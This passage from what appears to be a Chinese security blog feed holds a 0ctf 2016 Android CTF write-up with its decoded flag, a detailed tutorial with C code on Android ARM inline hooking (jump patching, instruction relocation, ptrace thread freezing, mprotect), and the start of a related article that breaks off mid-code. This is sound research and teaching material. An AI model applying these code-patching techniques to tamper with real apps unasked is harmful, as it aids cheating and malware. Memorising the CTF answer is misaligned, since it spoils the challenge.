<h2 id="boomshakalaka"><a href="#boomshakalaka" class="headerlink" title="boomshakalaka"></a>boomshakalaka</h2><p>首先<a href="/downloads/0ctf-2016-boomshakalaka.zip">点我</a>下载APK，安装运行APK后，发现是一个类似之前微信上的打飞机游戏。<br>直接用jeb反编译APK，没有任何保护处理，反编译代码如下图：<br><img src="/images/0ctf-2016-boomshakalaka-writeup-2.png" alt="2"><br>可以看到APK初始化时，新建了两个xml文件，分别为flag.xml和CocosdxPrefsfile.xml，并且分别写入了一些字符串，其中flag文件中的<code>YmF6aW5nYWFhYQ==</code>明显为base64编码，随便找了个在线base64解码，解码后为<code>bazingaaaa</code>,再凑上Flag的标志，组合为<code>0ctf{bazingaaaa}</code>，提交后提示错误。<br>运行游戏，没有得分，直接暂停。CocosdxPrefsfile.xml的内容为：<br><code>MGN0ZntDMGNvUzJkX0FuRHJv</code><br>经过多次测试，每次游戏完成初始化后，CocosdxPrefsfile.xml的内容均为上诉字符串。同样是base64编码，解码后为<code>0ctf{C0coS2d_AnDro</code>,很明显地方找对了，但是Flag不全。<br>接着继续游戏，随便得了几分，然后撞死。CocosdxPrefsfile.xml的内容为：<br><code>MGN0ZntDMGNvUzJkX0FuRHJv...dz99</code><br>发现除了开始初始化的固定字符串意外，结尾也同样是固定的<code>dz99</code>，猜测是游戏结束时写入的固定串。<br>根据得到最高分的提示，开始找关于得分的函数。Java层没几个类，因此重心转到so，把libcocos2dcpp.so拖到ida里，通过score关键字找到关键函数<code>ControlLayer::updateScore(int)</code>，直接F5后，发现逻辑就是根据每次击中飞机得到的分数，向CocosdxPrefsfile.xml写入对应的字符串，如图：<br><img src="/images/0ctf-2016-boomshakalaka-writeup-3.png" alt="3"><br><img src="/images/0ctf-2016-boomshakalaka-writeup-4.png" alt="4"><br>值得注意的是，其中最大分数被设置为1000000000分，其对应的字符串为<code>4w</code>,因此结合前面分析，字符串为:<br><code>MGN0ZntDMGNvUzJkX0FuRHJv4wdz99</code><br>解码后为<code>0ctf{C0coS2d_AnDro?</code>，出现了乱码，明显还是不对。<br>分析到这里，这道题几乎已经是完成了。剩下的就是开始拼凑Flag了。通过多次尝试，最后我们按照<code>ControlLayer::updateScore(int)</code>中所有分数的从小到大的顺序，将其对应的字符串组合到一起为：<br><code>MWRfRzBtRV9Zb1VfS24w</code><br>再将头部和尾部组合到一起：<br><code>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</code><br>解码后为<code>0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}</code>，搞定。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>flag.xml的内容是为了提示我们CocosdxPrefsfile.xml的内容也是base64编码。</li>
<li>千万不要真的手动打最高分，毫无意义。</li>
</ol>
<p>最后吐槽一下，这道题毫无技术含量，逻辑也有很大问题。从技术来看，只要具备基本的Android逆向技能，就能定位到<code>ControlLayer::updateScore(int)</code>，事实上，我用了5分钟就找到了这个函数，但是到最后找到Flag用了几个小时。按照题目得到最高分的提示，我直接在上层函数修改了分数为1000000000分，得到字符串为<code>MGN0ZntDMGNvUzJkX0FuRHJv4wdz99</code>。我继续尝试修改分数为2147483647（32位有符号整数的最大值），得到字符串为<code>MGN0ZntDMGNvUzJkX0FuRHJvdz99</code>。然后又设想了整数溢出之类的问题。最后的答案竟然是把所有分数的字符串全部拼在一起，我不知道这样拼凑和<code>play the game, get the highest score</code>有什么联系，并且正确的Flag几乎不可能出现在CocosdxPrefsfile.xml中。<br>讲道理而论，这道题真的浪费了我几个小时的青春（当然不排除我不玩ctf，too young too simple,sometimes naive）。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2016年0ctf中的mobile题目boomshakalaka的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Arm Inline Hook</title>
    <link href="http://ele7enxxh.com/Android-Arm-Inline-Hook.html"/>
    <id>http://ele7enxxh.com/Android-Arm-Inline-Hook.html</id>
    <published>2016-01-27T03:55:00.000Z</published>
    <updated>2016-03-23T06:25:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文将结合<a href="https://github.com/ele7enxxh/Android-Inline-Hook" target="_blank" rel="external">本项目</a>的源代码，详细阐述Android Arm Inline Hook的原理与实现过程。<a id="more"></a></p>
<h2 id="什么是Inline-Hook"><a href="#什么是Inline-Hook" class="headerlink" title="什么是Inline Hook"></a>什么是Inline Hook</h2><p>Inline Hook即内部跳转Hook，通过替换函数开始处的指令为跳转指令，使得原函数跳转到自己的函数，通常还会保留原函数的调用接口。与GOT表Hook相比，Inline Hook具有更广泛的适用性，几乎可以Hook任何函数，不过其实现更为复杂，考虑的情况更多，并且无法对一些太短的函数Hook。<br>其基本原理请参阅网上其他资料。</p>
<h2 id="需要解决的问题"><a href="#需要解决的问题" class="headerlink" title="需要解决的问题"></a>需要解决的问题</h2><blockquote>
<ol>
<li>Arm模式与Thumb模式的区别</li>
<li>跳转指令的构造</li>
<li>PC相关指令的修正</li>
<li>线程处理</li>
<li>其他一些细节</li>
</ol>
</blockquote>
<p>下面我将结合源码对这几个问题进行解决。</p>
<h2 id="Arm模式与Thumb模式的区别"><a href="#Arm模式与Thumb模式的区别" class="headerlink" title="Arm模式与Thumb模式的区别"></a>Arm模式与Thumb模式的区别</h2><p>本文讨论的对象为基于32位的Arm架构的Inline Hook，在Arm版本7及以上的体系中，其指令集分为Arm指令集和Thumb指令集。Arm指令为4字节对齐，每条指令长度均为32位；Thumb指令为2字节对齐，又分为Thumb16、Thumb32，其中Thumb16指令长度为16位，Thumb32指令长度为32位。<br>在对一个函数进行Inline Hook时，首先需要判断当前函数指令是Arm指令还是Thumb指令，指令使用目标地址值的bit[0]来确定目标地址的指令类型。bit[0]的值为1时，目标程序为Thumb指令；bit[0]值为0时，目标程序为ARM指令。其相关实现代码为以下宏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 设置bit[0]的值为1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_BIT0(addr)		(addr | 1)</span></div><div class="line"><span class="comment">// 设置bit[0]的值为0</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CLEAR_BIT0(addr)	(addr &amp; 0xFFFFFFFE)</span></div><div class="line"><span class="comment">// 测试bit[0]的值，若为1则返回真，若为0则返回假</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST_BIT0(addr)		(addr &amp; 1)</span></div></pre></td></tr></table></figure></p>
<h2 id="跳转指令的构造"><a href="#跳转指令的构造" class="headerlink" title="跳转指令的构造"></a>跳转指令的构造</h2><p>跳转指令主要分为以下两种：</p>
<blockquote>
<ul>
<li>B系列指令：B、BL、BX、BLX</li>
<li>直接写PC寄存器</li>
</ul>
</blockquote>
<p>Arm的B系列指令跳转范围只有4M，Thumb的B系列指令跳转范围只有256字节，然而大多数情况下跳转范围都会大于4M，故我们采用<code>LDR PC, [PC, ?]</code>构造跳转指令。另外Thumb16指令中并没有合适的跳转指令，如果单独使用Thumb16指令构造跳转指令，需要使用更多的指令完成，并且在后续对PC相关指令的修正也更加繁琐，故综合考虑下，决定放弃对ARMv5的支持。<br>另外，Arm处理器采用3级流水线来增加处理器指令流的速度，也就是说程序计数器R15(PC)总是指向“正在取指”的指令，而不是指向“正在执行”的，即PC总是指向当前正在执行的指令地址再加2条指令的地址。比如当前指令地址是0×8000， 那么当前pc的值，在thumb下面是0×8000 + 2 <em> 2， 在arm下面是0×8000 + 4 </em> 2。<br>对于Arm指令集，跳转指令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LDR PC, [PC, #-4]</div><div class="line">addr</div></pre></td></tr></table></figure></p>
<p><code>LDR PC, [PC, #-4]</code>对应的机器码为：0xE51FF004，<code>addr</code>为要跳转的地址。该跳转指令范围为32位，对于32位系统来说即为全地址跳转。<br>对于Thumb32指令集，跳转指令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LDR.W PC, [PC, #0]</div><div class="line">addr</div></pre></td></tr></table></figure></p>
<p><code>LDR.W PC, [PC, #0]</code>对应的机器码为：0x00F0DFF8，<code>addr</code>为要跳转的地址。同样支持任意地址跳转。<br>其相关实现代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Arm Mode</span></div><div class="line"><span class="keyword">if</span> (TEST_BIT0(item-&gt;target_addr)) &#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">	i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (CLEAR_BIT0(item-&gt;target_addr) % <span class="number">4</span> != <span class="number">0</span>) &#123;</div><div class="line">		((<span class="keyword">uint16_t</span> *) CLEAR_BIT0(item-&gt;target_addr))[i++] = <span class="number">0xBF00</span>;  <span class="comment">// NOP</span></div><div class="line">	&#125;</div><div class="line">	((<span class="keyword">uint16_t</span> *) CLEAR_BIT0(item-&gt;target_addr))[i++] = <span class="number">0xF8DF</span>;</div><div class="line">	((<span class="keyword">uint16_t</span> *) CLEAR_BIT0(item-&gt;target_addr))[i++] = <span class="number">0xF000</span>;	<span class="comment">// LDR.W PC, [PC]</span></div><div class="line">	((<span class="keyword">uint16_t</span> *) CLEAR_BIT0(item-&gt;target_addr))[i++] = item-&gt;new_addr &amp; <span class="number">0xFFFF</span>;</div><div class="line">	((<span class="keyword">uint16_t</span> *) CLEAR_BIT0(item-&gt;target_addr))[i++] = item-&gt;new_addr &gt;&gt; <span class="number">16</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// Thumb Mode</span></div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	((<span class="keyword">uint32_t</span> *) (item-&gt;target_addr))[<span class="number">0</span>] = <span class="number">0xe51ff004</span>;	<span class="comment">// LDR PC, [PC, #-4]</span></div><div class="line">	((<span class="keyword">uint32_t</span> *) (item-&gt;target_addr))[<span class="number">1</span>] = item-&gt;new_addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先通过TEST_BIT0宏判断目标函数的指令集类型，其中若为Thumb指令集，多了下面一个额外处理：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (CLEAR_BIT0(item-&gt;target_addr) % <span class="number">4</span> != <span class="number">0</span>) &#123;</div><div class="line">	((<span class="keyword">uint16_t</span> *) CLEAR_BIT0(item-&gt;target_addr))[i++] = <span class="number">0xBF00</span>;  <span class="comment">// NOP</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对bit[0]的值清零，若其值4字节不对齐，则添加一个2字节的<code>NOP</code>指令，使得后续的指令4字节对齐。这是因为在Thumb32指令中，若该指令对PC寄存器的值进行了修改，则该指令必须是4字节对齐的，否则为非法指令。</p>
<h2 id="PC相关指令的修正"><a href="#PC相关指令的修正" class="headerlink" title="PC相关指令的修正"></a>PC相关指令的修正</h2><p>不论是Arm指令集还是Thumb指令集，都存在很多的与PC值相关的指令，例如：B系列指令、literal系列指令等。原有函数的前几个被跳转指令替换的指令将会被搬移到trampoline_instructions中，此时PC值已经变动，所以需要对PC相关指令进行修正（所谓修正即为计算出实际地址，并使用其他指令完成同样的功能）。相关修正代码位于relocate.c文件中。其中<code>INSTRUCTION_TYPE</code>描述了需要修正的指令，限于篇幅，这里仅阐述Arm指令的修正过程，对应的代码为<code>relocateInstructionInArm</code>函数。<br>函数原型如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">target_addr: 待Hook的目标函数地址，即为当前PC值，用于修正指令</div><div class="line">orig_instructions：存放原有指令的首地址，用于修正指令和后续对原有指令的恢复</div><div class="line">length：存放的原有指令的长度，Arm指令为8字节；Thumb指令为12字节</div><div class="line">trampoline_instructions：存放修正后指令的首地址，用于调用原函数</div><div class="line">orig_boundaries：存放原有指令的指令边界（所谓边界即为该条指令与起始地址的偏移量），用于后续线程处理中，对PC的迁移</div><div class="line">trampoline_boundaries：存放修正后指令的指令边界，用途与上相同</div><div class="line">count：处理的指令项数，用途与上相同</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">relocateInstructionInArm</span><span class="params">(<span class="keyword">uint32_t</span> target_addr, <span class="keyword">uint32_t</span> *orig_instructions, <span class="keyword">int</span> length, <span class="keyword">uint32_t</span> *trampoline_instructions, <span class="keyword">int</span> *orig_boundaries, <span class="keyword">int</span> *trampoline_boundaries, <span class="keyword">int</span> *count)</span></span>;</div></pre></td></tr></table></figure></p>
<p>具体实现中，首先通过函数<code>getTypeInArm</code>判断当前指令的类型，本函数通过类型，共分为4个处理分支：</p>
<blockquote>
<ol>
<li>BLX_ARM、BL_ARM、B_ARM、BX_ARM</li>
<li>ADD_ARM</li>
<li>ADR1_ARM、ADR2_ARM、LDR_ARM、MOV_ARM</li>
<li>其他指令</li>
</ol>
</blockquote>
<h3 id="BLX-ARM、BL-ARM、B-ARM、BX-ARM指令的修正"><a href="#BLX-ARM、BL-ARM、B-ARM、BX-ARM指令的修正" class="headerlink" title="BLX_ARM、BL_ARM、B_ARM、BX_ARM指令的修正"></a>BLX_ARM、BL_ARM、B_ARM、BX_ARM指令的修正</h3><p>即为B系列指令（<code>BLX &lt;label&gt;</code>、<code>BL &lt;label&gt;</code>、<code>B &lt;label&gt;</code>、<code>BX PC</code>）的修正，其中<code>BLX_ARM</code>和<code>BL_ARM</code>需要修正LR寄存器的值，相关代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (type == BLX_ARM || type == BL_ARM) &#123;</div><div class="line">	trampoline_instructions[trampoline_pos++] = <span class="number">0xE28FE004</span>;	<span class="comment">// ADD LR, PC, #4</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接下来构造相应的跳转指令，即为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE51FF004</span>;  	<span class="comment">// LDR PC, [PC, #-4]</span></div></pre></td></tr></table></figure></p>
<p>最后解析指令，计算实际跳转地址<code>value</code>，并将其写入<code>trampoline_instructions</code>，相关代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (type == BLX_ARM) &#123;</div><div class="line">	x = ((instruction &amp; <span class="number">0xFFFFFF</span>) &lt;&lt; <span class="number">2</span>) | ((instruction &amp; <span class="number">0x1000000</span>) &gt;&gt; <span class="number">23</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (type == BL_ARM || type == B_ARM) &#123;</div><div class="line">	x = (instruction &amp; <span class="number">0xFFFFFF</span>) &lt;&lt; <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	x = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">top_bit = x &gt;&gt; <span class="number">25</span>;</div><div class="line">imm32 = top_bit ? (x | (<span class="number">0xFFFFFFFF</span> &lt;&lt; <span class="number">26</span>)) : x;</div><div class="line"><span class="keyword">if</span> (type == BLX_ARM) &#123;</div><div class="line">	value = pc + imm32 + <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	value = pc + imm32;</div><div class="line">&#125;</div><div class="line">trampoline_instructions[trampoline_pos++] = value;</div></pre></td></tr></table></figure></p>
<p>如此便完成了B系列指令的修正，关于指令的字节结构请参考Arm指令手册。</p>
<h3 id="ADD-ARM指令的修正"><a href="#ADD-ARM指令的修正" class="headerlink" title="ADD_ARM指令的修正"></a>ADD_ARM指令的修正</h3><p><code>ADD_ARM</code>指的是<code>ADR Rd, &lt;label&gt;</code>格式的指令，其中<code>&lt;label&gt;</code>与PC相关。<br>首先通过循环遍历，得到Rd寄存器，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> rd;</div><div class="line"><span class="keyword">int</span> rm;</div><div class="line"><span class="keyword">int</span> r;</div><div class="line"></div><div class="line"><span class="comment">// 解析指令得到rd、rm寄存器</span></div><div class="line">rd = (instruction &amp; <span class="number">0xF000</span>) &gt;&gt; <span class="number">12</span>;</div><div class="line">rm = instruction &amp; <span class="number">0xF</span>;</div><div class="line"></div><div class="line"><span class="comment">// 为避免冲突，排除rd、rm寄存器，选择一个临时寄存器Rr</span></div><div class="line"><span class="keyword">for</span> (r = <span class="number">12</span>; ; --r) &#123;</div><div class="line">	<span class="keyword">if</span> (r != rd &amp;&amp; r != rm) &#123;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接下来是构造修正指令：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// PUSH &#123;Rr&#125;，保护Rr寄存器值</span></div><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE52D0004</span> | (r &lt;&lt; <span class="number">12</span>);</div><div class="line"><span class="comment">// LDR Rr, [PC, #8]，将PC值存入Rr寄存器中</span></div><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE59F0008</span> | (r &lt;&lt; <span class="number">12</span>);</div><div class="line"><span class="comment">// 变换原指令`ADR Rd, &lt;label&gt;`为`ADR Rd, Rr, ?`</span></div><div class="line">trampoline_instructions[trampoline_pos++] = (instruction &amp; <span class="number">0xFFF0FFFF</span>) | (r &lt;&lt; <span class="number">16</span>);</div><div class="line"><span class="comment">//POP &#123;Rr&#125;，恢复Rr寄存器值</span></div><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE49D0004</span> | (r &lt;&lt; <span class="number">12</span>);</div><div class="line"><span class="comment">// ADD PC, PC，跳过下一条指令</span></div><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE28FF000</span>;</div><div class="line">trampoline_instructions[trampoline_pos++] = pc;</div></pre></td></tr></table></figure></p>
<h3 id="ADR1-ARM、ADR2-ARM、LDR-ARM、MOV-ARM"><a href="#ADR1-ARM、ADR2-ARM、LDR-ARM、MOV-ARM" class="headerlink" title="ADR1_ARM、ADR2_ARM、LDR_ARM、MOV_ARM"></a>ADR1_ARM、ADR2_ARM、LDR_ARM、MOV_ARM</h3><p>分别为<code>ADR Rd, &lt;label&gt;</code>、<code>ADR Rd, &lt;label&gt;</code>、<code>LDR Rt, &lt;label&gt;</code>、<code>MOV Rd, PC</code>。<br>同样首先解析指令，得到<code>value</code>，相关代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> r;</div><div class="line"><span class="keyword">uint32_t</span> value;</div><div class="line"></div><div class="line">r = (instruction &amp; <span class="number">0xF000</span>) &gt;&gt; <span class="number">12</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (type == ADR1_ARM || type == ADR2_ARM || type == LDR_ARM) &#123;</div><div class="line">	<span class="keyword">uint32_t</span> imm32;</div><div class="line">	</div><div class="line">	imm32 = instruction &amp; <span class="number">0xFFF</span>;</div><div class="line">	<span class="keyword">if</span> (type == ADR1_ARM) &#123;</div><div class="line">		value = pc + imm32;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (type == ADR2_ARM) &#123;</div><div class="line">		value = pc - imm32;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (type == LDR_ARM) &#123;</div><div class="line">		<span class="keyword">int</span> is_add;</div><div class="line">		</div><div class="line">		is_add = (instruction &amp; <span class="number">0x800000</span>) &gt;&gt; <span class="number">23</span>;</div><div class="line">		<span class="keyword">if</span> (is_add) &#123;</div><div class="line">			value = ((<span class="keyword">uint32_t</span> *) (pc + imm32))[<span class="number">0</span>];</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span> &#123;</div><div class="line">			value = ((<span class="keyword">uint32_t</span> *) (pc - imm32))[<span class="number">0</span>];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">	value = pc;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后构造修正指令，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// LDR Rr, [PC]</span></div><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE51F0000</span> | (r &lt;&lt; <span class="number">12</span>);</div><div class="line"><span class="comment">// 跳过下一条指令</span></div><div class="line">trampoline_instructions[trampoline_pos++] = <span class="number">0xE28FF000</span>;	<span class="comment">// ADD PC, PC</span></div><div class="line">trampoline_instructions[trampoline_pos++] = value;</div></pre></td></tr></table></figure></p>
<h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><p>事实上，还有些指令格式需要修正，例如：<code>PUSH {PC}</code>、<code>PUSH {SP}</code>等，虽然这些指令被Arm指令手册标记为<strong>deprecated</strong>，但是仍然为合法指令，不过在实际汇编中并未发现此类指令，故未做处理，相关代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 直接将指令存放到trampoline_instructions中</span></div><div class="line">trampoline_instructions[trampoline_pos++] = instruction;</div></pre></td></tr></table></figure></p>
<p>处理完所有待处理指令后，最后加入返回指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">// LDR PC, [PC, #-4]</div><div class="line">trampoline_instructions[trampoline_pos++] = 0xe51ff004;</div><div class="line">trampoline_instructions[trampoline_pos++] = lr;</div></pre></td></tr></table></figure></p>
<p>Thumb指令的修正，大家可以参考这里的思路，自行阅读源码。</p>
<h2 id="线程处理"><a href="#线程处理" class="headerlink" title="线程处理"></a>线程处理</h2><p>一个完善的Inline Hook方案必须要考虑多线程环境，即要考虑线程恰好执行到被修改指令的位置。在Window下，使用<code>GetThreadContext</code>和<code>SetThreadContext</code>枚举所有线程，迁移context到搬迁后的指令中。然而在Linux+Arm环境下，并没有直接提供相同功能的API，不过可以使用<code>ptrace</code>完成，主要流程如下：</p>
<blockquote>
<ol>
<li>解析/proc/self/task目录，获取所有线程id</li>
<li>创建子进程，父进程等待。子进程枚举所有线程，PTRACE_ATTACH线程，迁移线程PC寄存器，枚举完毕后，子进程给自己发SIGSTOP信号，等待父进程唤醒</li>
<li>父进程检测到子进程已经SIGSTOP，完成Inline Hook工作，向子进程发送SIGCONT信号，同时等待子进程退出</li>
<li>子进程枚举所有线程，PTRACE_DETACH线程，枚举完毕后，子进程退出</li>
<li>父进程继续其他工作</li>
</ol>
</blockquote>
<p>这里使用子进程完成线程处理工作，实际上是迫不得已的。因为，如果直接使用本进程<code>PTRACE_ATTACH</code>线程，会出现<strong>operation not permitted</strong>，即使赋予root权限也是同样的错误，具体原因不得而知。<br>具体代码请参考<code>freeze</code>与<code>unFreeze</code>两个函数。</p>
<h2 id="其他一些细节"><a href="#其他一些细节" class="headerlink" title="其他一些细节"></a>其他一些细节</h2><ol>
<li>页保护<br>页面大小为4096字节，使用<code>mprotect</code>函数修改页面属性，修改为<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>。</li>
<li>刷新缓存<br>对于ARM处理器来说，缓存机制作用明显，内存中的指令已经改变，但是cache中的指令可能仍为原有指令，所以需要手动刷新cache中的内容。采用<code>cacheflush</code>即可实现。</li>
<li>一个已知的BUG<br>虽然本库已经把大部分工作放在了<code>registerInlineHook</code>函数中，但是在<code>inlineHook</code>、<code>inlineUnHook</code>函数中还是不可避免的使用了部分libc库的API函数，例如：<code>mprotect</code>、<code>memcpy</code>、<code>munmap</code>、<code>free</code>、<code>cacheflush</code>等。如果使用本库对上述API函数进行Hook，可能会失败甚至崩溃，这是因为此时原函数的指令已经被破坏，或者其逻辑已经改变。解决这个Bug有两个方案，第一是采用其他Hook技术；第二将本库中的这些API函数全部采用内部实现，即不依赖于libc库，可采用静态链接libc库，或者使用汇编直接调相应的系统调用号。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文将结合&lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;本项目&lt;/a&gt;的源代码，详细阐述Android Arm Inline Hook的原理与实现过程。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ARM平台backtrace与inlineHook多线程安全浅析</title>
    <link href="http://ele7enxxh.com/Analysis-Of-Backtrace-And-Inline-Hook-Thread-Safety-On-The-ARM-Platform.html"/>
    <id>http://ele7enxxh.com/Analysis-Of-Backtrace-And-Inline-Hook-Thread-Safety-On-The-ARM-Platform.html</id>
    <published>2015-11-27T06:02:00.000Z</published>
    <updated>2016-03-23T06:25:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要讨论了Android+ARM平台的backtrace原理以及inlineHook中涉及到的多线程安全的问题。<a id="more"></a></p>
<blockquote>
<p>本文关于Arm Inline Hook线程处理的解决方案已经过时，新方案点<a href="http://ele7enxxh.com/Android-Arm-Inline-Hook.html">这里</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在之前的Android inline hook项目中，在复杂环境下，如果遇到下面两个场景可能导致异常，甚至引起被hook进程的crash。</p>
<ol>
<li>待hook的函数正在执行；</li>
<li>待hook的函数处于函数调用栈中；<br>举个例子，代码为：<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"inlineHook.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_thread</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"new_a\n"</span>);</div><div class="line">		sleep(<span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">thread</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">		<span 